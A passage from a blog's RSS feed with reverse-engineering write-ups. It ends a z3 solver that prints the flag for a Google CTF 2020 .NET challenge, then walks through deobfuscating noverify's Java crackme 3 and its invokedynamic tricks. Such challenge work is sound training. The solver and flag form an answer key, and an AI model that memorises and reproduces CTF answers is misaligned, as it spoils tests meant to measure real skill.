s.add(UGE(MATHOPEN[<span class="number">14</span>], <span class="number">48</span>))</span><br><span class="line">  s.add(UGE(MATHOPEN[<span class="number">29</span>], <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">  s.add(ULE(MATHOPEN[<span class="number">0</span>] + MATHOPEN[<span class="number">1</span>] + MATHOPEN[<span class="number">2</span>] + MATHOPEN[<span class="number">3</span>] + MATHOPEN[<span class="number">4</span>] - <span class="number">130</span>, <span class="number">10</span>))</span><br><span class="line">  s.add(ULE(MATHOPEN[<span class="number">5</span>] + MATHOPEN[<span class="number">6</span>] + MATHOPEN[<span class="number">7</span>] + MATHOPEN[<span class="number">8</span>] + MATHOPEN[<span class="number">9</span>] - <span class="number">140</span>, <span class="number">10</span>))</span><br><span class="line">  s.add(ULE(MATHOPEN[<span class="number">10</span>] + MATHOPEN[<span class="number">11</span>] + MATHOPEN[<span class="number">12</span>] + MATHOPEN[<span class="number">13</span>] + MATHOPEN[<span class="number">14</span>] - <span class="number">150</span> ,<span class="number">10</span>)) </span><br><span class="line">  s.add(ULE(MATHOPEN[<span class="number">15</span>] + MATHOPEN[<span class="number">16</span>] + MATHOPEN[<span class="number">17</span>] + MATHOPEN[<span class="number">18</span>] + MATHOPEN[<span class="number">19</span>] - <span class="number">160</span> ,<span class="number">10</span>)) </span><br><span class="line">  s.add(ULE(MATHOPEN[<span class="number">20</span>] + MATHOPEN[<span class="number">21</span>] + MATHOPEN[<span class="number">22</span>] + MATHOPEN[<span class="number">23</span>] + MATHOPEN[<span class="number">24</span>] - <span class="number">170</span> ,<span class="number">10</span>)) </span><br><span class="line"></span><br><span class="line">  s.add(ULE(MATHOPEN[<span class="number">0</span>] + MATHOPEN[<span class="number">5</span>] + MATHOPEN[<span class="number">10</span>] + MATHOPEN[<span class="number">15</span>] + MATHOPEN[<span class="number">20</span>] + MATHOPEN[<span class="number">25</span>] - <span class="number">172</span>, <span class="number">6</span>)) </span><br><span class="line">  s.add(ULE(MATHOPEN[<span class="number">1</span>] + MATHOPEN[<span class="number">6</span>] + MATHOPEN[<span class="number">11</span>] + MATHOPEN[<span class="number">16</span>] +MATHOPEN[<span class="number">21</span>] + MATHOPEN[<span class="number">26</span>] - <span class="number">162</span>, <span class="number">6</span>)) </span><br><span class="line">  s.add(ULE(MATHOPEN[<span class="number">2</span>] + MATHOPEN[<span class="number">7</span>] + MATHOPEN[<span class="number">12</span>] + MATHOPEN[<span class="number">17</span>]+ MATHOPEN[<span class="number">22</span>] + MATHOPEN[<span class="number">27</span>] - <span class="number">152</span>, <span class="number">6</span>)) </span><br><span class="line">  s.add(ULE(MATHOPEN[<span class="number">3</span>] + MATHOPEN[<span class="number">8</span>] + MATHOPEN[<span class="number">13</span>] + MATHOPEN[<span class="number">18</span>] + MATHOPEN[<span class="number">23</span>] - <span class="number">142</span>, <span class="number">6</span>)) </span><br><span class="line">  s.add(ULE(MATHOPEN[<span class="number">4</span>] + MATHOPEN[<span class="number">9</span>] + MATHOPEN[<span class="number">14</span>] + MATHOPEN[<span class="number">19</span>] + MATHOPEN[<span class="number">24</span>] + MATHOPEN[<span class="number">29</span>] - <span class="number">132</span>, <span class="number">6</span>)) </span><br><span class="line"></span><br><span class="line">  num45 = ((MATHOPEN[<span class="number">7</span>] + (MATHOPEN[<span class="number">27</span>] * <span class="number">3</span>)) * <span class="number">3</span> - MATHOPEN[<span class="number">5</span>] * <span class="number">13</span>) - <span class="number">57</span></span><br><span class="line">  s.add(ULE(num45, <span class="number">28</span>))</span><br><span class="line">  </span><br><span class="line">  num45 = (MATHOPEN[<span class="number">22</span>] * <span class="number">3</span> + ((MATHOPEN[<span class="number">14</span>] &lt;&lt; <span class="number">2</span>) - (MATHOPEN[<span class="number">20</span>] * <span class="number">5</span>))) - <span class="number">12</span></span><br><span class="line">  s.add(ULE(num45, <span class="number">70</span>))</span><br><span class="line"></span><br><span class="line">  num46 = (MATHOPEN[<span class="number">14</span>] + (MATHOPEN[<span class="number">16</span>] * <span class="number">2</span>)) * <span class="number">2</span> + ((MATHOPEN[<span class="number">15</span>] - ( MATHOPEN[<span class="number">18</span>] * <span class="number">2</span>)) * <span class="number">3</span>) - MATHOPEN[<span class="number">17</span>] * <span class="number">5</span></span><br><span class="line">  s.add(MATHOPEN[<span class="number">13</span>] + num46 == <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">  s.add(MATHOPEN[<span class="number">5</span>] == MATHOPEN[<span class="number">6</span>] * <span class="number">2</span>)</span><br><span class="line">  s.add(MATHOPEN[<span class="number">29</span>] + MATHOPEN[<span class="number">7</span>] == <span class="number">59</span>)</span><br><span class="line">  s.add(MATHOPEN[<span class="number">0</span>] == MATHOPEN[<span class="number">17</span>] * <span class="number">6</span>)</span><br><span class="line">  s.add(MATHOPEN[<span class="number">8</span>] == MATHOPEN[<span class="number">9</span>] * <span class="number">4</span>)</span><br><span class="line">  s.add(MATHOPEN[<span class="number">11</span>] &lt;&lt; <span class="number">1</span> == MATHOPEN[<span class="number">13</span>] * <span class="number">3</span>)</span><br><span class="line">  s.add(MATHOPEN[<span class="number">13</span>] + MATHOPEN[<span class="number">29</span>] + MATHOPEN[<span class="number">11</span>] + MATHOPEN[<span class="number">4</span>] == MATHOPEN[<span class="number">19</span>])</span><br><span class="line">  s.add(MATHOPEN[<span class="number">10</span>] == MATHOPEN[<span class="number">12</span>] * <span class="number">13</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">  s = Solver()</span><br><span class="line">  inp = []</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    b = BitVec(<span class="string">&quot;%d_i&quot;</span> % i, <span class="number">32</span>)</span><br><span class="line">    inp.append(b)</span><br><span class="line">    s.add(ULE(inp[i], <span class="number">63</span>))</span><br><span class="line"></span><br><span class="line">  xor_res_list = xor_mod(inp)</span><br><span class="line">  res1 = random_shuffle(xor_res_list)</span><br><span class="line">  res2 = swap_more(res1)</span><br><span class="line"></span><br><span class="line">  s.add(Distinct(res2))</span><br><span class="line">  </span><br><span class="line">  ret_num = get_checksum(res2)</span><br><span class="line"></span><br><span class="line">  s.add(res2[<span class="number">28</span>] == ret_num )</span><br><span class="line"></span><br><span class="line">  final_conds(res2, s)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span> s.check()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    sol = s.model()</span><br><span class="line">    flag = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(inp)):</span><br><span class="line">      c = inp[i]</span><br><span class="line">      flag.append(<span class="built_in">int</span>(<span class="built_in">str</span>(sol[c])))</span><br><span class="line">    <span class="built_in">print</span> flag</span><br><span class="line">    <span class="built_in">print</span> decode_inp(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sat</span><br><span class="line">[12, 29, 15, 62, 12, 51, 51, 12, 47, 53, 18, 54, 32, 40, 44, 53, 39, 11, 56, 55, 27, 40, 36, 47, 47, 60, 15, 56, 49, 63]</span><br><span class="line">CTF&#123;CppClrIsWeirdButReallyFun&#125;</span><br></pre></td></tr></table></figure><h1 id="Solution-Files"><a href="#Solution-Files" class="headerlink" title="Solution Files"></a>Solution Files</h1><p>I’ve uploaded all the files including the IDAPython and z3 solver scripts along with the idb file on my github here :</p><blockquote><p><a href="https://github.com/mrT4ntr4/Challenge-Solution-Files/tree/master/GoogleCTF_2020_dotNet">mrT4ntr4/Challenge-Solution-Files/GoogleCTF_2020_dotNet</a></p></blockquote><p>I hope you liked this writeup :)<br>Well, Thanks for reading it…   </p><p><strong>STAY SAFE !</strong></p><a href="https://media.giphy.com/media/1zijfEWLg9bIuAXna7/giphy.gif" title="drawing" class="gallery-item"><img src="https://media.giphy.com/media/1zijfEWLg9bIuAXna7/giphy.gif" alt="drawing" width="300"/></a> </div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content:encoded>
      
      
      <category domain="https://mrt4ntr4.github.io/categories/CTF-Writeups/">CTF Writeups</category>
      
      
      <category domain="https://mrt4ntr4.github.io/tags/writeup/">writeup</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/reversing/">reversing</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/google/">google</category>
      
      
      <comments>https://mrt4ntr4.github.io/GoogleCTF-dotNet/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Solving Java Reversing Challenges - Noverify&#39;s Crackme 3</title>
      <link>https://mrt4ntr4.github.io/Noverify-Java-Crackme-3/</link>
      <guid>https://mrt4ntr4.github.io/Noverify-Java-Crackme-3/</guid>
      <pubDate>Sun, 19 Jul 2020 07:00:00 GMT</pubDate>
      
        
        
      <description>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/noverify/thumb.png" title="banner" class="gallery-item"><img src="/img/noverify/thumb.png" alt="banner"></a></p><h1 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h1><p>This time, we solve a Java crackme which focuses on InvokeDynamic instruction and has some basic obfuscation. We analyse the java bytecode instructions and use regex to bypass obfuscation.<br>And then, experiment with dynamic instrumentation to later debug and understand it. Also we talk about the tooling process often required to solve java reversing challenges.  </p><h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>Download <a href="https://crackmes.one/crackme/5eded0f533c5d449d91ae783"  target="_blank">noverify’s crackme 3</a></p></blockquote><hr><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Ahh, So It’s been a while I’ve written anything!  </p><p>The last two weeks I’ve been fiddling around with reversing java apps and got to try these cool crackmes by <a href="https://github.com/GraxCode/java-crackmes">@graxcoding</a>.<br>So the third one checks our input of a 64 bit long integer to validate it.  </p><p><a href="/img/noverify/sample_run.PNG"><a href="/img/noverify/sample_run.PNG" title="sample_run" class="gallery-item"><img src="/img/noverify/sample_run.PNG" alt="sample_run"></a></a>  </p><p>Jadx fails to extract any classes, not cool!  </p><p><a href="/img/noverify/jadx_classes.PNG"><a href="/img/noverify/jadx_classes.PNG" title="jadx_classes" class="gallery-item"><img src="/img/noverify/jadx_classes.PNG" alt="jadx_classes"></a></a>  </p><p>Also I tried using the jar tool’s <code>xf</code> option and other tools like Bytecode Viewer but got the same result ¯\<em>(ツ)</em>/¯<br>Then I remembered a video from <a href="https://youtu.be/QAzs66psLjY">MalwareAnalysisForHedgehogs</a> where he used this <a href="https://github.com/Securityinbits/blog-posts/tree/master/java_agent">dumper</a> as a java agent to dump the classes from an obfuscated jar file.<br>Basically our agent class must implement a public static premain method similar in principle to main method. After the JVM has initialized, the premain method will be called, then the real application main method.  </p><p><a href="/img/noverify/dumper.PNG"><a href="/img/noverify/dumper.PNG" title="dumper" class="gallery-item"><img src="/img/noverify/dumper.PNG" alt="dumper"></a></a>  </p><p>It worked perfectly and we have the <code>me_nov_crackme_CrackMe.class</code> file and can work on it.  </p><hr><h1 id="Static-Analysis"><a href="#Static-Analysis" class="headerlink" title="Static Analysis"></a>Static Analysis</h1><p>At first I tried using JADX again but failed…  </p><p><a href="/img/noverify/jadx_err.PNG"><a href="/img/noverify/jadx_err.PNG" title="jadx_err" class="gallery-item"><img src="/img/noverify/jadx_err.PNG" alt="jadx_err"></a></a>  </p><p>Then I used <a href="https://bytecodeviewer.com/">Bytecode Viewer</a> and some of the decompilers it comes with but sadly those didn’t work too and I’d had to go with the bytecode.  </p><p>I’ll only dig up into some of the bytecode instructions, so if you are not quite experienced with JVM I’d recommend the following tutorials :<br><a href="https://blog.jamesdbloom.com/JavaCodeToByteCode_PartOne.html">JavaCode To ByteCode - James D Bloom</a><br><a href="https://youtu.be/e2zmmkc5xI0">Java Bytecode Crash Course - David Buck</a></p><p>Also, And as a reference for the JVM instruction set we have the following:<br><a href="https://docs.oracle.com/javase/specs/jvms/se7/html/jvms-6.html">Oracle Java SE 7 Doc - The JVM Instruction Set</a><br><a href="https://en.wikipedia.org/wiki/Java_bytecode_instruction_listings">Wikipedia - Java Bytecode instruction Listings</a>  </p><p>I just copied the bytecode from Bytecode Viewer and started analysing it.  </p><p>It looks obfuscated but we can easily notice what is it doing …<br>For instance look at the following bytecode:  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">L1 &#123;</span><br><span class="line">    aload0</span><br><span class="line">    arraylength</span><br><span class="line">    ldc <span class="number">1163059851</span> (java.lang.Integer)  </span><br><span class="line">    ldc <span class="number">1163059850</span> (java.lang.Integer)</span><br><span class="line">    swap</span><br><span class="line">    ixor<span class="comment">// 1163059851 ^ 1163059850 = 1</span></span><br><span class="line">    if_icmpeq L34</span><br><span class="line">&#125;</span><br><span class="line">L37 &#123;</span><br><span class="line">    getstatic java/lang/System.out:java.io.PrintStream</span><br><span class="line">    ldc <span class="string">&quot;Welcome to noverify&#x27;s crackme! Please enter a numeric 64-bit key to play! The goal is to find a valid key!&quot;</span> (java.lang.String)</span><br><span class="line">    invokevirtual java/io/PrintStream.println(Ljava/lang/String;)V</span><br><span class="line">&#125;</span><br><span class="line">L38 &#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This can be interpreted as the following pseudocode :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(args.length != <span class="number">1</span>) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Welcome to noverify\&#x27;s crackme! Please enter a numeric 64-bit key to play! The goal is to find a valid key!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>And just after this we have what looks like a try-catch block.  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">L34 &#123; <span class="comment">// try block</span></span><br><span class="line">    f_new (Locals[<span class="number">1</span>]: [Ljava/lang/String;) (Stack[<span class="number">0</span>]: <span class="keyword">null</span>)</span><br><span class="line">    aload0</span><br><span class="line">    ldc <span class="number">705718574</span> (java.lang.Integer)</span><br><span class="line">    dup</span><br><span class="line">    dup_x1</span><br><span class="line">    pop</span><br><span class="line">    ixor<span class="comment">// 705718574 ^ 705718574 = 0</span></span><br><span class="line">    aaload</span><br><span class="line">    invokestatic java/lang/Long.parseLong(Ljava/lang/String;)J</span><br><span class="line">    lstore1</span><br><span class="line">&#125;</span><br><span class="line">L3 &#123; <span class="comment">// no exception</span></span><br><span class="line">    goto L5<span class="comment">// continue execution</span></span><br><span class="line">&#125;</span><br><span class="line">L4 &#123; <span class="comment">//catch exception</span></span><br><span class="line">    f_new (Locals[<span class="number">1</span>]: [Ljava/lang/String;) (Stack[<span class="number">1</span>]: java/lang/Throwable)</span><br><span class="line">    astore3</span><br><span class="line">&#125;</span><br><span class="line">L6 &#123;</span><br><span class="line">    getstatic java/lang/System.out:java.io.PrintStream</span><br><span class="line">    ldc <span class="string">&quot;Invalid key!&quot;</span> (java.lang.String)</span><br><span class="line">    invokevirtual java/io/PrintStream.println(Ljava/lang/String;)V</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Could easily be converted to the following:  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    myinput = Long.parseLong(args[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(Throwable e) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Invalid key!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Actually I noticed quite a pattern with the xor instructions and wrote a short python script to just comment the result for it.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">bytecode =  <span class="built_in">open</span>(<span class="string">&#x27;noverify_bytecode.java&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">repl1</span>(<span class="params">m</span>):</span></span><br><span class="line">    xor_res = <span class="built_in">int</span>(m.group(<span class="number">1</span>)) ^ <span class="built_in">int</span>(m.group(<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> re.sub(<span class="string">r&quot;($)&quot;</span>, <span class="string">&quot;// &quot;</span>+ m.group(<span class="number">1</span>) + <span class="string">&quot; ^ &quot;</span>\</span><br><span class="line">            + m.group(<span class="number">2</span>) + <span class="string">&quot; = [&quot;</span> + <span class="built_in">str</span>(xor_res) + <span class="string">&quot;]&quot;</span>+ <span class="string">&quot;\n\t\t\t &quot;</span>\</span><br><span class="line">            , m.group())</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">repl2</span>(<span class="params">m</span>):</span></span><br><span class="line">    <span class="keyword">return</span> re.sub(<span class="string">r&quot;($)&quot;</span>, <span class="string">&quot;// &quot;</span>+ m.group(<span class="number">1</span>) + <span class="string">&quot; ^ &quot;</span> \</span><br><span class="line">            + m.group(<span class="number">1</span>) + <span class="string">&quot; = [0]&quot;</span> + <span class="string">&quot;\n\t\t\t &quot;</span>\</span><br><span class="line">            , m.group())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">regex1 = <span class="string">r&quot; &#123;13&#125;ldc (.*) \(java\.lang\.Integer\)\n&quot;</span> \</span><br><span class="line">            +<span class="string">&quot; &#123;13&#125;ldc (.*) \(java\.lang\.Integer\)\n &#123;13&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">regex2 = <span class="string">r&quot; &#123;13&#125;ldc (.*) \(java\.lang\.Integer\)\n &#123;13&#125;dup\n &#123;13&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">got1 = re.sub(regex1, repl1, bytecode)</span><br><span class="line">got2 = re.sub(regex2, repl2, got1)</span><br><span class="line"></span><br><span class="line">out = <span class="built_in">open</span>(<span class="string">&#x27;formatted_bytecode.java&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">out.write(got2)</span><br><span class="line">out.close()</span><br></pre></td></tr></table></figure><p>The first regex searches for two consecutive <strong><code>ldc</code></strong> instruction on Integers.<br>And the latter one just checks for one <strong><code>ldc</code></strong> and other <strong><code>dup</code></strong> which always results in 0.<br>The result of these xors is used as predefined integers in the program.<br>And after some such xors we find some Congratulations and sorry strings which leads us to the checking instruction that makes use of one of the methods ie. <em><code>method 0</code></em> and passes an array to it as an argument.  </p><p><a href="/img/noverify/method_call_0.PNG"><a href="/img/noverify/method_call_0.PNG" title="method_call_0" class="gallery-item"><img src="/img/noverify/method_call_0.PNG" alt="method_call_0"></a></a>  </p><p>Tracing back to the array initialisation I found that there were actually two arrays :  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">L5 &#123;</span><br><span class="line">    f_new (Locals[<span class="number">2</span>]: [Ljava/lang/String;, <span class="number">4</span>) (Stack[<span class="number">0</span>]: <span class="keyword">null</span>)</span><br><span class="line">    ldc -<span class="number">1563720133</span> (java.lang.Integer)</span><br><span class="line">    ldc -<span class="number">1563720130</span> (java.lang.Integer)</span><br><span class="line">    <span class="comment">// -1563720133 ^ -1563720130 = [5]</span></span><br><span class="line">    swap</span><br><span class="line">    ixor</span><br><span class="line">    newarray <span class="number">8</span>  <span class="comment">//arr1[5]</span></span><br><span class="line">    astore3</span><br><span class="line">&#125;</span><br><span class="line">L7 &#123;</span><br><span class="line">    ldc -<span class="number">2143046895</span> (java.lang.Integer)</span><br><span class="line">    ldc -<span class="number">2143046894</span> (java.lang.Integer)</span><br><span class="line">    <span class="comment">// -2143046895 ^ -2143046894 = [3]</span></span><br><span class="line">    swap</span><br><span class="line">    ixor</span><br><span class="line">    newarray <span class="number">8</span>  <span class="comment">//arr2[3]</span></span><br><span class="line">    astore4</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Taking help from the instruction set manual we see that they are both byte arrays.  </p><p><a href="/img/noverify/arr_type_codes.PNG"><a href="/img/noverify/arr_type_codes.PNG" title="arr_type_codes" class="gallery-item"><img src="/img/noverify/arr_type_codes.PNG" alt="arr_type_codes"></a></a>  </p><p>Subsequently we observe <strong><code>bastore</code></strong> in every label below which does some calculations and store the result in these bytearrays.<br>So only the array with length as 3 is passed and which depends on our input.<br>Then we can see that there are several methods named numerically other than 0 and I explored them the other day.  </p><h2 id="Indy-in-Action"><a href="#Indy-in-Action" class="headerlink" title="Indy in Action"></a>Indy in Action</h2><p>Continuing further it is important we understand about invokedynamic.<br>We can easily observe the InvokeDynamic instruction at the return of every other method other than main.  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">invokedynamic me/nov/crackme/CrackMe<span class="number">.127</span>([Ljava/lang/Object;)Ljava/lang/Object; : <span class="number">64</span>([Ljava/lang/Object;)Ljava/lang/Object; ([Ljava/lang/Object;)Ljava/lang/Object;</span><br><span class="line">areturn</span><br></pre></td></tr></table></figure><p>The invokedynamic (or simply Indy) is used for optimization and creating efficient java programs and implements a runtime system that can choose the most appropriate implementation of a method or function after the program has been compiled.</p><p><a href="https://www.infoworld.com/article/2860079/invokedynamic-101.html">InvokeDynamic 101</a><br><a href="https://youtu.be/KhiECfzyVt0">InvokeDynamic for Mere Mortals</a><br>Also checkout how are lambdas in java implemented with making use of invokedynamic <a href="https://youtu.be/MLksirK9nnE">here</a>  </p><p>For examples we have the following implementations :  </p><ul><li>Lambda Expressions in Java 8+: <code>LambdaMetafactory</code></li><li>String Concatenation in Java 9+: <code>StringConcatFactory</code></li></ul><p>For instance, in newer versions of Java, String Concatenation is not done by appending the string elements multiple times using StringBuilder append function, instead it places those in an array and makes use of invokedynamic and StringConcatFactory to have a single method call.  </p><p>Furthering researching about the topic I came across this post by the official JEB blog.<br><a href="https://www.pnfsoftware.com/blog/android-o-and-dex-version-38-new-dalvik-opcodes-to-support-dynamic-invocation/">https://www.pnfsoftware.com/blog/android-o-and-dex-version-38-new-dalvik-opcodes-to-support-dynamic-invocation/</a>  </p><p>And I thought to give <a href="https://www.pnfsoftware.com/">JEB Pro</a> a try to see how well it handles it. Apart from some ambiguous variable names all is fine.  </p><p>So basically for indy there is a bootStrap method that creates a callsite which points to a handle to a predefined method.  </p><p>Here <strong><code>127</code></strong> looks like the bootstrap method!  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="number">127</span>(Object[] arg8) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">char</span> v3 = (<span class="keyword">char</span>)((Thread.currentThread().getStackTrace()[<span class="number">2</span>].getMethodName().hashCode() * arg8[<span class="number">0</span>].toString().hashCode() * <span class="number">32767</span> &lt;&lt; <span class="number">3</span> | <span class="number">127</span>) &amp; <span class="number">127</span>);</span><br><span class="line">        <span class="keyword">if</span>(Thread.currentThread().getStackTrace().length &gt; <span class="number">127</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> v3 &gt; <span class="number">127</span> ? Boolean.valueOf(<span class="keyword">false</span>) : Boolean.valueOf(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MutableCallSite(((MethodHandles.Lookup)arg8[<span class="number">0</span>]).findStatic(CrackMe.class, String.valueOf(CrackMe.fun), ((MethodType)arg8[<span class="number">3</span>])));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Throwable unused_ex) &#123;</span><br><span class="line">        <span class="keyword">return</span> CrackMe<span class="number">.0</span>(<span class="keyword">new</span> Object[]&#123;arg8[<span class="number">3</span>].toString()&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Basically, it returns a callsite which points to a method handle it finds when searching for a static method with the value of fun in the class Crackme.  </p><p>Reference - <a href="https://developer.android.com/reference/java/lang/invoke/MutableCallSite">MutableCallSite</a></p><h2 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="number">0</span>(Object[] arg5) &#123;</span><br><span class="line">    <span class="keyword">char</span> v5 = (<span class="keyword">char</span>)((Thread.currentThread().getStackTrace()[<span class="number">2</span>].getMethodName().hashCode() * Integer.parseInt(arg5[<span class="number">0</span>].toString()) * <span class="number">32767</span> &lt;&lt; <span class="number">3</span> | <span class="number">127</span>) &amp; <span class="number">65535</span>);</span><br><span class="line">    <span class="keyword">if</span>(Thread.currentThread().getStackTrace().length &gt; <span class="number">127</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> v5 &gt;= <span class="number">127</span> ? Boolean.valueOf(<span class="keyword">false</span>) : Boolean.valueOf(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CrackMe.fun = <span class="keyword">new</span> String(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">char</span>[]&#123;v5&#125;).getBytes(StandardCharsets.UTF_8), StandardCharsets.UTF_8).charAt(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> InvokeCustoms.CallSite0_64(<span class="keyword">new</span> Object[]&#123;((<span class="keyword">int</span>)(v5 ^ <span class="number">64</span>))&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It converts the string passed as an array to a 3 digit integer and does the following operation on it.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(( get_hashcode(callee_fcn) * arg) * <span class="number">0x7FFF</span> &lt;&lt; <span class="number">3</span> | <span 